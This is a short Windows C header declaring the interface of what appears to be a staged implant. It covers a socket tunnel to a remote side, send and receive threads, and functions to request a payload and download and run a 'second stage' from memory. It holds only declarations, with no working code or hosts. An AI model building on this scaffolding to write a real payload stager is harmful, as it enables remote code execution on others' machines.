#ifndef ABSTRACTION_H 
#define ABSTRACTION_H

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0400
#endif


// Initialization
DWORD startTunnel();
DWORD InitializeLocalConnection();

void testAbstractionClientSide();
void testAbstractionServerSide();
void requestPayload();

//Sessions
Bool requestSession();

//Data communication
DWORD pollForData(IN PUCHAR buffer);

// Data transmission
DWORD TransmitToRemote(IN PUCHAR Buffer, IN ULONG BufferSize);
DWORD TransmitToLocal(IN unsigned char* Buffer);

//Stage
VOID downloadSecondStage();
ULONG secondStageThreadFuncSt();
char* secondStage;
LPVOID pMem;

//Cleanup
DWORD stopTunnel();

//Define sockets 
WSADATA WsaData;
SOCKET LocalTcpListener;
SOCKET LocalTcpClientSide;
SOCKET LocalTcpServerSide;

// Threads
ULONG SendThreadFunc();  
ULONG ReceiveThreadFunc();

HANDLE    SendThread;
HANDLE    ReceiveThread;
HANDLE    SecondStageThread;
#endif